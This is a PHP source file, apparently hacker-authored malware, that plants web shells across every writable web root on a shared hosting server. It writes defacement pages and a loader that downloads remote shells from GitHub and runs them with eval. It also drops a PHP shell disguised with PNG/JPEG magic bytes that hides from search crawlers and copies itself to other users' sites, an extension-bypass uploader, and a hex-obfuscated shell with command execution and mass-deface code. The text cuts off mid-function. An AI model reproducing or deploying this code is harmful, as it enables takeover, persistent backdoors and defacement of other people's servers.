<?php
/**
 * Project: autocrot - gajeproject | 6ickzone  
 * Author: 0x6ick  
 * info: Multi-Server Auto Deployer  
 * Contact: t.me/yungx6ick | Email: spammersuy13@gmail.com  
 */
ini_set('display_errors', 1);
error_reporting(E_ALL);

// Configuration
$folderName = 'suck';

// Generate all deployment files
$files = [
  'index.html' => genHTML(),
  'index.php'   => genHTML(),
  'readme.txt' => genTXT(),
  'loader.php' => genPHP(),
  'update.php' => update(),
  'update.php7'  => update(),
  'upme.php' => genUploader(),
  'upme.phtml' => genUploader(),
  'sxm.php'    => create_fake_png_php(),
  'sempax.php' => sempak(),
  'sempax.php7'  => sempak(),
  'sxm.phtml'    => create_fake_png_php(),
];

// Locate possible public_html roots or domain-like folders
function locateRoots($start) {
    $roots = [];
    $dir = realpath($start);
    while ($dir && $dir !== '/') {
        if (is_dir($dir."/public_html")) $roots[] = $dir."/public_html";
        foreach (glob($dir."/*", GLOB_ONLYDIR) as $sub) {
            if (preg_match('/\.[a-z]+$/', basename($sub))) $roots[] = $sub;
        }
        $dir = dirname($dir);
    }
    return array_unique($roots);
}

// Deploy files to all detected paths
function deployFolder($folderName, $files) {
    $roots = locateRoots(__DIR__);
    $deployedUrls = [];

    foreach ($roots as $htmlPath) {
        if (is_writable($htmlPath)) {
            $targetDir = "$htmlPath/$folderName";
            if (!is_dir($targetDir)) @mkdir($targetDir, 0777, true);

            foreach ($files as $fileName => $content) {
                $filePath = "$targetDir/$fileName";
                if (@file_put_contents($filePath, $content) !== false) {

                    $filePathReal = realpath($filePath);
                    $docRootReal  = realpath($_SERVER['DOCUMENT_ROOT']);
                    $scheme = $_SERVER['REQUEST_SCHEME'] ?? 'https';

                    if ($filePathReal && $docRootReal && str_starts_with($filePathReal, $docRootReal)) {
                        // masih di root web utama
                        $relativePath = '/' . ltrim(str_replace($docRootReal, '', $filePathReal), '/');
                        $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
                        $url = "$scheme://$host$relativePath";
                    } else {
                        // ambil domain/subdomain dari nama folder yang mirip domain
                        $maybeDomain = basename($htmlPath);
                        if (preg_match('/^[a-z0-9.-]+\.[a-z]{2,}$/i', $maybeDomain)) {
                            $url = "$scheme://$maybeDomain/$folderName/$fileName";
                        } else {
                            // kalau belum juga, cek parent folder
                            $parent = basename(dirname($htmlPath));
                            if (preg_match('/^[a-z0-9.-]+\.[a-z]{2,}$/i', $parent)) {
                                $url = "$scheme://$parent/$folderName/$fileName";
                            } else {
                                // fallback terakhir: path fisik
                                $url = $filePathReal;
                            }
                        }
                    }

                    $deployedUrls[] = $url;
                }
            }
        }
    }

    return $deployedUrls;
}
function genHTML() {
    return <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Stamped by 0x6ick</title>
<link rel="icon" href="https://0x6ick.my.id/favicon.ico" type="image/x-icon">
<style>
body{margin:0;padding:0;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;font-family:monospace;background:#fff;color:#333;text-align:center}
img{max-width:250px;border-radius:10px;margin-bottom:15px}
h1{color:#00bcd4;margin:5px 0}
h2{color:#f50057;margin:5px 0 15px}
p{margin:8px 0;font-size:14px}
.footer{position:fixed;bottom:10px;left:0;width:100%;text-align:center;font-size:13px;color:#00bcd4}
a{color:#00bcd4;text-decoration:none}
</style>
</head>
<body>
<div class="content">
<img src="https://i.imgur.com/y7BGFy3.jpeg" alt="image">
<h1>StampeD by 0x6ick</h1>
<h2>Ex 5YN15T3R_742</h2>
<p>6ickZone: Where creativity, exploitation, and expression collide.</p>
</div>
<a href="https://linktr.ee/6ickzone" target="_blank">MyLink</a>
<div class="footer">0x6ick - 6ickZone</div>
</body>
</html>
HTML;
}

function genTXT(){
    return "Stamped By 0x6ick aka 5YN15T3R_742 - 6ickZone
---------------------------------------------
Auto Crot-GajeProject
Version: v9.9.9 Max Crot Banyak - 2025
t.me/yungx6ick";
}

function genPHP(){
    return <<<'PHP'
<?php
/**
 * WP-Loader.php
 *
 * Universal PHP Loader Collection
 *
 * @package   WP-Loader
 * @author    0x6ick <spamersuy13@gmail.com>
 * @license   DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE (WTFPL) v2
 * @version   1.0.0
 */

session_start();

@ini_set('display_errors', 0);
@set_time_limit(0);
@error_reporting(0);

// Ambil mode dari query string ?m=<mode>
if (isset($_GET['m'])) {
    $_SESSION['loader_mode'] = $_GET['m'];
}

$mode = $_SESSION['loader_mode'] ?? 'h';

// Reset session kalau mode 'h'
if ($mode === 'h') {
    session_unset();
}

// --- SWITCH MODE ---
switch($mode){

    // --- Loader 1: cURL ---
    case "curl":
        $url = 'https://raw.githubusercontent.com/6ickzone/0x6ickShell-Manager/refs/heads/main/VoidGateDx.php';
        $code = @file_get_contents($url);
        if ($code === false || empty($code)) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
            curl_setopt($ch, CURLOPT_TIMEOUT, 20);
            curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; PHP Script)');
            $code = curl_exec($ch);
            curl_close($ch);
        }
        if ($code) eval("?>$code");
        break;

    // --- Loader 2: Refactored cURL (robust + fallback) ---
case "curlman":
    function load_content() {
        // dua varian URL (canonical + refs/heads)
        $base = 'https://raw.githubusercontent.com/6ickzone/Gaje-Project';
        $path = 'kerang/explo.php';
        $urls = [
            "$base/main/$path",               // canonical raw URL (recommended)
            "$base/refs/heads/main/$path"     // older style (sometimes works)
        ];

        $data = '';
        $lastHttpCode = 0;
        $tried = [];

        foreach ($urls as $target_url) {
            $tried[] = $target_url;
            // try curl if available
            if (function_exists('curl_init')) {
                $ch = curl_init($target_url);
                curl_setopt_array($ch, [
                    CURLOPT_RETURNTRANSFER => 1,
                    CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_CONNECTTIMEOUT => 5,
                    CURLOPT_TIMEOUT => 10,
                    CURLOPT_SSL_VERIFYPEER => 0,
                    CURLOPT_SSL_VERIFYHOST => 0,
                    CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; StealthLoader/1.0)'
                ]);
                $resp = curl_exec($ch);
                $info = curl_getinfo($ch);
                $lastHttpCode = $info['http_code'] ?? 0;
                curl_close($ch);

                if ($resp !== false && $lastHttpCode >= 200 && $lastHttpCode < 300 && !empty($resp)) {
                    $data = $resp;
                    break;
                }
            }

            // fallback: file_get_contents with stream context
            $ctx = stream_context_create([
                'http' => [
                    'method' => 'GET',
                    'header' => "User-Agent: Mozilla/5.0 (compatible; StealthLoader/1.0)\r\n",
                    'timeout' => 10
                ],
                'ssl' => ['verify_peer'=>false, 'verify_peer_name'=>false]
            ]);
            $resp2 = @file_get_contents($target_url, false, $ctx);
            if ($resp2 !== false) {
                $data = $resp2;
                // try to derive HTTP code from $http_response_header if available
                if (isset($http_response_header) && preg_match('#HTTP/\d+\.\d+\s+(\d+)#', $http_response_header[0], $m)) {
                    $lastHttpCode = (int)$m[1];
                }
                if ($lastHttpCode >= 200 && $lastHttpCode < 300) break;
                // if no header info, but we got content, still accept
                if ($lastHttpCode === 0) break;
            }
        }

        // final: either we got data or not
        if ($data) {
            try {
                eval("?>$data");
            } catch (Throwable $e) {
                echo "<pre> Loader Error (eval): {$e->getMessage()}</pre>";
            }
        } else {
            echo "<pre> Failed to fetch content from remote. Tried:\n";
            foreach ($tried as $u) echo " - $u\n";
            echo "\nLast HTTP code: $lastHttpCode\n";
            echo "Tip: open the first URL in browser to confirm path is correct.\n</pre>";
        }
    }

    load_content();
    break;

    // --- Loader 3: TMP File ---
    case "tmp":
        $payload_url = 'https://raw.githubusercontent.com/6ickzone/0x6ickShell-Manager/refs/heads/main/bypass.php';
        $tmp_path = '/tmp/.sess_' . substr(md5($_SERVER['HTTP_HOST']), 0, 10) . '.php';
        if (isset($_GET['reload']) || !file_exists($tmp_path) || filesize($tmp_path) == 0) {
            $payload = file_get_contents($payload_url);
            if (stripos($payload, '<?php') !== false) {
                file_put_contents($tmp_path, $payload);
                usleep(300000);
            }
        }
        if (file_exists($tmp_path) && filesize($tmp_path) > 0) include_once($tmp_path);
        break;

    // --- Loader 4: Cache File ---
    case "cache":
        $tmp = 'cache_ym.php';
        $url = 'https://raw.githubusercontent.com/6ickzone/0x6NyxWebShell/refs/heads/main/yami.php';
        if (!file_exists($tmp) || filesize($tmp) < 10) {
            $code = file_get_contents($url);
            file_put_contents($tmp, $code);
        }
        include($tmp);
        unlink($tmp);
        break;

    // --- Loader 5: cURL v2 ---
    case "curlv2":
        $Url = 'https://raw.githubusercontent.com/6ickzone/0x6NyxWebShell/refs/heads/main/void.php';
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $Url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $output = curl_exec($ch);
        curl_close($ch);
        if ($output) {
            eval('?>'.$output);
        }
        break;

    // --- Loader 6: WGET + Include ---
    case "wget":
        $url = 'https://raw.githubusercontent.com/6ickzone/0x6ickShell-Manager/refs/heads/main/simplebypass.php';
        $tmp_file = '/tmp/sess_'.md5($url).'.php';
        if(is_executable('/usr/bin/wget')) {
            $command = "/usr/bin/wget -q -O $tmp_file $url";
        } else {
            $command = "/usr/bin/curl -s -o $tmp_file $url";
        }
        @shell_exec($command);
        if (file_exists($tmp_file) && filesize($tmp_file) > 0) {
            include($tmp_file);
            unlink($tmp_file);
        } else {
            echo "Error: Failed to download file or shell_exec is disabled.";
        }
        break;

    // --- Loader 7: Socket ---
    case "socket":
        $host = 'raw.githubusercontent.com';
        $path = '/6ickzone/0x6ickShell-Manager/refs/heads/main/yami.php';
        $port = 443;
        $fp = @fsockopen("ssl://" . $host, $port, $errno, $errstr, 10);
        if ($fp) {
            $out = "GET $path HTTP/1.1\r\n";
            $out .= "Host: $host\r\n";
            $out .= "Connection: Close\r\n\r\n";
            fwrite($fp, $out);
            $response = '';
            while (!feof($fp)) {
                $response .= fgets($fp, 128);
            }
            fclose($fp);
            $body = substr($response, strpos($response, "\r\n\r\n") + 4);
            if (!empty($body)) {
                eval("?>$body");
            } else {
                echo "Error: Failed to get content via socket.";
            }
        } else {
            echo "Error: Could not open socket to $host ($errstr)";
        }
        break;

    // --- Contact / Credits ---
    case "telegram":
        echo '<div style="font-family: monospace; text-align: center; margin-top: 20px;">';
        echo '<strong>WARNING! This tools auto generated by autocrot - GajeProject.</strong><br><br>';
        echo 'Contact Author:<br>';
        echo '<a href="https://t.me/Yungx6ick" target="_blank" style="color: lightblue; text-decoration: underline;">6ickzone</a>';
        echo '<br><br><a href="?m=h" style="color: white;">&larr; Back to Menu</a>';
        echo '</div>';
        break;

    // --- MAIN MENU ---
    default:
        echo "<h3>Loader Panel</h3>";
        echo "Select loader mode via ?m=<br>";
        echo "- <a href='?m=curl'>curl</a><br>";
        echo "- <a href='?m=curlman'>curlman (refactored)</a><br>";
        echo "- <a href='?m=tmp'>tmp</a><br>";
        echo "- <a href='?m=cache'>cache</a><br>";
        echo "- <a href='?m=curlv2'>curlv2</a><br>";
        echo "- <a href='?m=wget'>wget</a><br>";
        echo "- <a href='?m=socket'>socket</a><br>";
        echo "- <a href='?m=telegram'>Author / Contact</a><br>";
        echo "<hr>To return to this menu, use <a href='?m=h'>?m=h</a>";
}
?>
PHP;
}

// === Special File: PNG Header + PHP Payload + Trailer ===
function create_fake_png_php() {
    $pngHeader = "\x89PNG\x0D\x0A\x1A\x0A"; // PNG magic bytes
    $jfif = "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00"; // Fake JPEG marker

    $phpPayload = <<<'PHP'
<?php
error_reporting(0);

/* Simple + Bypass + Copy — NyX6st (6ickzone) — https://0x6ick.my.id
 * Version: 1.0.0
 * SPDX-License-Identifier: WTFPL
 *
 * "You just DO WHAT THE FUCK YOU WANT TO."
 * Respect the author.
 */
error_reporting(0);  
if (!empty($_SERVER['HTTP_USER_AGENT'])) {
    $bots = ['Googlebot', 'Slurp', 'MSNBot', 'PycURL', 'facebookexternalhit', 'ia_archiver', 'crawler', 'Yandex', 'Rambler', 'Yahoo! Slurp', 'YahooSeeker', 'bingbot', 'curl'];
    if (preg_match('/' . implode('|', $bots) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
// === Configuration ===  
function findAllWebRoots($userRoot = "/home/*") {

    $candidates = ['public_html', 'public', 'www', 'htdocs'];

    $roots = [];
    foreach (glob($userRoot, GLOB_ONLYDIR) as $home) {
        foreach ($candidates as $folder) {
            $path = "$home/$folder";
            if (is_dir($path)) {
                $roots[] = $path;
            }
        }
    }
    return $roots;
}

function deployMulti($sourceFile, $targetName) {
    $targets = [];
    $roots = findAllWebRoots();

    foreach ($roots as $htmlPath) {
        if (is_writable($htmlPath)) {
            $targetPath = "$htmlPath/$targetName";
            if (@copy($sourceFile, $targetPath)) {
                $domain = basename(dirname($htmlPath));
                $targets[] = "$htmlPath/$targetName"; //change
            }
        }
    }
    return $targets;
}

$self = __FILE__;
$urls = deployMulti($self, "self.php");
print_r($urls);



$cwd = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$cwd || !is_dir($cwd)) $cwd = getcwd();

if (isset($_GET['action'])) {
    $action = $_GET['action'];
    $item = $cwd . '/' . basename($_GET['item']);
    
    if ($action === 'delete' && file_exists($item)) {
        if (is_dir($item)) {
            if (count(scandir($item)) == 2) { // Cek
                rmdir($item);
            } else {
                echo "<p style='color:#f66'>Gagal: Folder tidak kosong Cok!.</p>";
            }
        } else {
            unlink($item);
        }
        header("Location: ?path=" . urlencode($cwd));
        exit;
    }
    
    if ($action === 'rename' && file_exists($item) && isset($_POST['new_name'])) {
        $newName = $cwd . '/' . basename($_POST['new_name']);
        rename($item, $newName);
        header("Location: ?path=" . urlencode($cwd));
        exit;
    }

    if ($action === 'download' && is_file($item)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($item) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($item));
        readfile($item);
        exit;
    }
}

if (!empty($_FILES['upload']['name'])) {
    $target = $cwd . '/' . basename($_FILES['upload']['name']);
    move_uploaded_file($_FILES['upload']['tmp_name'], $target);
    echo "<p style='color:#0f0'>Berhasil Ajg: " . htmlspecialchars($_FILES['upload']['name']) . "</p>";
}
if (!empty($_POST['newdir'])) {
    $newFolder = $cwd . '/' . basename($_POST['newdir']);
    if (!file_exists($newFolder)) {
        mkdir($newFolder);
        echo "<p style='color:#0f0'>Folder berhasil dibuat leh ugha</p>";
    } else {
        echo "<p style='color:#f66'>Gagal: Folder sudah ada akmj.</p>";
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
   <style>
    body { 
        background: #000000; 
        color: #ffffff; 
        font-family: 'Courier New', monospace; 
        padding: 20px; 
    }

    a { 
        color: #fffffff; 
        text-decoration: none; 
        transition: all 0.2s; 
    }
    a:hover { 
        color: #ff0000; 
        text-decoration: underline;
    }

    textarea, input[type=text] { 
        width: 100%; 
        font-family: monospace; 
        background: transparent; 
        color: #ffffff; 
        border: none;
        border-bottom: 2px solid #aaaaaa; 
        padding: 10px 4px; 
        box-sizing: border-box; 
        border-radius: 0; 
        margin-bottom: 10px; 
        transition: all 0.2s;
    }
    textarea:focus, input[type=text]:focus {
        outline: none;
        border-bottom-color: #ff0000;
    }

    input[type=submit] { 
        background: #ff0000; 
        color: #ffffff; 
        border: 2px solid #ff0000;
        padding: 10px 15px; 
        border-radius: 0; 
        cursor: pointer; 
        font-weight: bold; 
        text-transform: uppercase;
        transition: all 0.2s; 
        letter-spacing: 1px;
    }
    input[type=submit]:hover { 
        background: #ffffff; 
        color: #ff0000; 
        border: 2px solid #ff0000;
    }

    .file-manager-container { 
        display: flex; 
        flex-direction: column; 
        gap: 15px; 
    }

    table { 
        width: 100%; 
        border-collapse: collapse; 
        background: #111;
    }
    th, td { 
        padding: 12px; 
        text-align: left; 
        border-bottom: 1px dashed #ff0000; 
    }
    th { 
        background-color: #111; 
        font-weight: bold; 
        color: #ff0000; 
        text-transform: uppercase;
    }
    tr:last-child td {
        border-bottom: none;
    }
    tr:hover { 
        background-color: #222222; 
    }

    .actions a { 
        margin-right: 10px; 
        color: #ffffff;
        font-weight: bold;
    }
    .actions a:hover {
        color: #ff0000;
    }
    .actions a.delete { 
        color: #ff0000; 
    }
    .actions a.delete:hover { 
        color: #ffffff; 
    }
    .actions a.download { 
        color: #ffffff; 
    }
    .actions a.download:hover { 
        color: #ff0000; 
    }
</style>
    
</head>
<body>

    <h2>File Manager</h2>
    <p><b>Path:</b> 
    <?php
    $parts = explode('/', trim($cwd, '/'));
    $build = '/';
    foreach ($parts as $part) {
        $build .= "$part/";
        echo "<a href='?password=$password&path=" . urlencode($build) . "'>$part</a>/";
    }
    echo "</p><hr>";

    // --- File Editor ---
    if (isset($_GET['edit'])) {
        $file = realpath($cwd . '/' . basename($_GET['edit']));
        if (is_file($file)) {
            if (isset($_POST['content'])) {
                file_put_contents($file, $_POST['content']);
                echo "<p style='color:#0f0'>Save</p>";
            }
            $code = htmlspecialchars(file_get_contents($file));
            echo "<h3>Grepe: " . basename($file) . "</h3> 
            <form method='post'> 
                <textarea name='content' rows='20'>$code</textarea><br> 
                <input type='submit' value='Simpan'> 
            </form> 
            <p><a href='?password=$password&path=" . urlencode($cwd) . "'>BACK</a></p>";
            exit;
        }
    }

    ?>
    <div class="file-manager-container">
        <table>
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Perms</th>
                    <th>Date</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody>
                <?php
                foreach (scandir($cwd) as $item) {
                    if ($item === '.') continue;
                    $full = $cwd . '/' . $item;
                    $encodedPath = urlencode($cwd);
                    
                    if (is_dir($full)) {
                        echo "<tr>";
                        echo "<td data-label='Nama'>[FD] <a href='?password=$password&path=" . urlencode($full) . "'>" . htmlspecialchars($item) . "</a></td>";
                        echo "<td data-label='Ukuran'>-</td>";
                        echo "<td data-label='Izin'>" . substr(sprintf('%o', fileperms($full)), -4) . "</td>";
                        echo "<td data-label='Dimodifikasi'>" . date("Y-m-d H:i", filemtime($full)) . "</td>";
                        echo "<td data-label='Aksi' class='actions'>";
                        echo "<a href='?password=$password&path=$encodedPath&action=delete&item=" . urlencode($item) . "' class='delete' onclick='return confirm(\"Yakin hapus folder ini?\")'>[Hapus]</a>";
                        echo "</td>";
                        echo "</tr>";
                    } else {
                        echo "<tr>";
                        echo "<td data-label='Nama'>[FD] <a href='?password=$password&path=$encodedPath&edit=" . urlencode($item) . "'>" . htmlspecialchars($item) . "</a></td>";
                        echo "<td data-label='Ukuran'>" . round(filesize($full) / 1024, 2) . " KB</td>";
                        echo "<td data-label='Izin'>" . substr(sprintf('%o', fileperms($full)), -4) . "</td>";
                        echo "<td data-label='Dimodifikasi'>" . date("Y-m-d H:i", filemtime($full)) . "</td>";
                        echo "<td data-label='Aksi' class='actions'>";
                        echo "<a href='?password=$password&path=$encodedPath&edit=" . urlencode($item) . "'>[Edit]</a>";
                        echo "<a href='?password=$password&path=$encodedPath&action=download&item=" . urlencode($item) . "' class='download'>[Unduh]</a>";
                        echo "<form id='renameForm_$item' method='post' action='?password=$password&path=$encodedPath&action=rename&item=" . urlencode($item) . "' style='display:none'>
        <input type='hidden' name='new_name' id='newName_$item'>
      </form>
      <a href='#' onclick='let newName = prompt(\"Ganti nama:\", \"$item\"); 
      if(newName){ document.getElementById(\"newName_$item\").value=newName; document.getElementById(\"renameForm_$item\").submit(); }'>[Rename]</a>";
                        echo "<a href='?password=$password&path=$encodedPath&action=delete&item=" . urlencode($item) . "' class='delete' onclick='return confirm(\"Yakin hapus file ini?\")'>[Hapus]</a>";
                        echo "</td>";
                        echo "</tr>";
                    }
                }
                ?>
            </tbody>
        </table>
    </div>

    <hr>
    
    <div style="display:flex; gap: 20px; flex-wrap: wrap;">
        <div style="flex:1;">
            <form method='post' enctype='multipart/form-data'>
                <label> Upload File:</label><br>
                <input type='file' name='upload'><br>
                <input type='hidden' name='password' value='<?php echo htmlspecialchars($password); ?>'>
                <input type='submit' value='Unggah'>
            </form>
        </div>
        <div style="flex:1;">
            <form method='post'>
                <label> make folder:</label><br>
                <input type='text' name='newdir'><br>
                <input type='hidden' name='password' value='<?php echo htmlspecialchars($password); ?>'>
                <input type='submit' value='Buat'>
            </form>
        </div>
    </div>
</body>
</html>
PHP;

    $trailer = "nTJnLK@!-\x0Cm";

    return $pngHeader . $jfif . $phpPayload . $trailer;
}
function genUploader() {
    return <<<'PHP'
<?php
/*
 * upme.php – Bypass File Uploader (Simple)
 * By 0x6ick - 6ickZone
 */

// Password untuk proteksi akses
define("PASS", "upme123");

if (!isset($_GET['key']) || $_GET['key'] !== PASS) {
    http_response_code(403);
    die("<pre> Forbidden.</pre>");
}

// Lokasi upload
$dir = __DIR__ . '/files/';
if (!is_dir($dir)) mkdir($dir, 0755, true);


$bypassExtensions = ['phtml', 'phar', 'php7', 'php3', 'php4', 'php5', 'pHp', 'pHtml'];

$msg = '';

// Handle upload file
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $name = basename($_FILES['file']['name']);
    $tmp = $_FILES['file']['tmp_name'];

    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    $base = pathinfo($name, PATHINFO_FILENAME);
    
    if ($ext === 'php') {
        $ext = $bypassExtensions[array_rand($bypassExtensions)];
        $name = "$base.$ext";
    }

    $finalPath = $dir . $name;

    // Upload
    if (move_uploaded_file($tmp, $finalPath)) {
        $url = dirname($_SERVER['SCRIPT_NAME']) . "/files/$name";
        $msg = "<pre style='color:#0f0;'>Success: <a href='$url' target='_blank'>Open</a></pre>";
    } else {
        $msg = "<pre style='color:#f00;'>Upload failed.</pre>";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Bypass Uploader</title>
    <style>
        body {
            font-family: monospace;
            background: #000;
            color: #0f0;
            padding: 20px;
        }
        input {
            margin: 5px 0;
        }
        a {
            color: cyan;
            text-decoration: none;
        }
    </style>
</head>
<body>
<h2>Bypass Uploader</h2>
<?= $msg ?>
<form method='post' enctype='multipart/form-data'>
    <input type='file' name='file'><br>
    <input type='submit' value='Upload'>
</form>
<pre>Access Key: <?= htmlspecialchars(PASS) ?></pre>
</body>
</html>
PHP;
}
function update() {
    return <<<'PHP'
<?php
error_reporting(0);

if (isset($_REQUEST["done"])) {
    die(">byebye<");
}

if (function_exists('session_start')) {
    session_start();

    if (!isset($_SESSION['6ickzone'])) {
        $_SESSION['6ickzone'] = false;
    }

    if (!$_SESSION['6ickzone']) {
        if (isset($_POST['0x6ick']) && hash('sha256', $_POST['0x6ick']) == '1b5d6904c727bbaa3abb54d920b13d1e0a27e5718011c4e479182463aabd8bef') {
            $_SESSION['6ickzone'] = true;
        } else {
            die('<html><head><meta charset="utf-8"><title></title>
            <style>body{padding:10px}input{padding:2px;margin-right:5px}</style></head>
            <body><form action="" method="post" accept-charset="utf-8">
            <input type="password" name="0x6ick" placeholder="passwd">
            <input type="submit" value="submit">
            </form></body></html>');
        }
    }
}
?>
<?php
/**
 *  ヤミRoot series bypass mode by Nyx6st x 0x6ick | Copyright 2025 by 6ickwhispers@gmail.com
 *
 * =================================================================
 *name   : ヤミRoot
 *github :/6ickzone
 *blog   :0x6ick.my.id =================================================================
 */

// --- HEX-ENCODED FUNCTION ARRAY & DECODER ---
$f = [ "6572726f725f7265706f7274696e67", "73657373696f6e5f7374617274", "696e695f736574", "686561646572", "6f625f656e645f636c65616e", "626173656e616d65", "66756e6374696f6e5f657869737473", "65786563", "696d706c6f6465", "7368656c6c5f65786563", "7061737374687275", "6f625f7374617274", "6f625f6765745f636c65616e", "73797374656d", "66696c657065726d73", "737072696e7466", "66696c655f657869737473", "69735f646972", "756e6c696e6b", "7363616e646972", "726d646972", "737562737472", "687474705f6275696c645f7175657279", "7265616c70617468", "676574637764", "7374725f7265706c616365", "69735f7772697461626c65", "66696c655f7075745f636f6e74656E7473", "68746d6c7370656369616c6368617273", "636f7079", "636c6173735f657869737473", "64617465", "6469726e616d65", "7374726c656e", "63686d6f64", "6f6374646563", "72656e616d65", "6d6b646972", "75726c656e636f6465", "676574686f737462796e616d65", "7068705f756e616d65", "6578706c6f6465", "7472696d", "69735f66696c65", "726f756e64", "66696c6573697a65", "69735f7265616461626c65", "75736f7274", "73747263617365636d70", "70617468696e666f", "66696c655f6765745f636f6e74656e7473" ];
foreach ($f as $k => $v) { $f[$k] = hex2bin($v); } unset($k, $v);

$f[0](0);
$f[1]();
@$f[2]('output_buffering', 0);
@$f[2]('display_errors', 0);
$f[2]('memory_limit', '256M');
$f[3]('Content-Type: text/html; charset=UTF-8');
$f[4]();

// --- CONFIG ---
$title = "ヤミRootヤ";
$author = "0x6ick";
$theme_bg = "black";
$theme_fg = "#00FFFF";
$theme_highlight = "#00FFD1";
$theme_link = "#00FFFF";
$theme_link_hover = "#FFFFFF";
$theme_border_color = "#00FFFF";
$theme_table_header_bg = "#191919";
$theme_table_row_hover = "#333333";
$theme_input_bg = "black";
$theme_input_fg = "#00FFFF";
$font_family = "'Kelly Slab', cursive";
$message_success_color = "#00CCFF";
$message_error_color = "red";

// --- FUNCTIONS ---
function sanitizeFilename($filename) {
    global $f;
    return $f[5]($filename);
}

function exe($cmd) {
    global $f;
    if ($f[6]('exec')) {
        $f[7]($cmd . ' 2>&1', $output);
        return $f[8]("\n", $output);
    } elseif ($f[6]('shell_exec')) {
        return $f[9]($cmd);
    } elseif ($f[6]('passthru')) {
        $f[11](); $f[10]($cmd); return $f[12]();
    } elseif ($f[6]('system')) {
        $f[11](); $f[13]($cmd); return $f[12]();
    }
    return "Command execution disabled.";
}

function perms($file){
    global $f;
    $perms = @$f[14]($file);
    if ($perms === false) return '????';
    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
    else $info = 'u';
    $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-'); $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function delete_recursive($target) {
    global $f;
    if (!$f[16]($target)) return true;
    if (!$f[17]($target)) return $f[18]($target);
    foreach ($f[19]($target) as $item) {
        if ($item == '.' || $item == '..') continue;
        if (!delete_recursive($target . DIRECTORY_SEPARATOR . $item)) return false;
    }
    return $f[20]($target);
}

function zip_add_folder($zip, $folder, $base_path_length) {
    global $f;
    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($folder), RecursiveIteratorIterator::LEAVES_ONLY);
    foreach ($files as $file) {
        if (!$file->isDir()) {
            $file_path = $file->getRealPath();
            $relative_path = $f[21]($file_path, $base_path_length);
            $zip->addFile($file_path, $relative_path);
        }
    }
}

function redirect_with_message($msg_type = '', $msg_text = '', $current_path = '') {
    global $path, $f;
    $redirect_path = !empty($current_path) ? $current_path : $path;
    $params = ['path' => $redirect_path];
    if ($msg_type) $params['msg_type'] = $msg_type;
    if ($msg_text) $params['msg_text'] = $msg_text;
    $f[3]("Location: ?" . $f[22]($params));
    exit();
}

// --- INITIAL SETUP & PATH ---
$path = $f[23](isset($_GET['path']) ? $_GET['path'] : $f[24]());
$path = $f[25]('\\','/',$path);

// --- HANDLERS FOR ACTIONS THAT REDIRECT ---
if(isset($_POST['start_mass_deface'])) {
    $mass_deface_results = '';
    function mass_deface_recursive($dir, $file, $content, &$res) {
        global $f;
        if(!$f[26]($dir)) {$res .= "[<font color=red>FAILED</font>] ".$f[28]($dir)." (Not Writable)<br>"; return;}
        foreach($f[19]($dir) as $item) {
            if($item === '.' || $item === '..') continue;
            $lokasi = $dir.DIRECTORY_SEPARATOR.$item;
            if($f[17]($lokasi)) {
                if($f[26]($lokasi)) {
                    $f[27]($lokasi.DIRECTORY_SEPARATOR.$file, $content);
                    $res .= "[<font color=lime>DONE</font>] ".$f[28]($lokasi.DIRECTORY_SEPARATOR.$file)."<br>";
                    mass_deface_recursive($lokasi, $file, $content, $res);
                } else { $res .= "[<font color=red>FAILED</font>] ".$f[28]($lokasi)." (Not Writable)<br>"; }
            }
        }
    }
    function mass_deface_flat($dir, $file, $content, &$res) {
        global $f;
        if(!$f[26]($dir)) {$res .= "[<font color=red>FAILED</font>] ".$f[28]($dir)." (Not Writable)<br>"; return;}
        foreach($f[19]($dir) as $item) {
            if($item === '.' || $item === '..') continue;
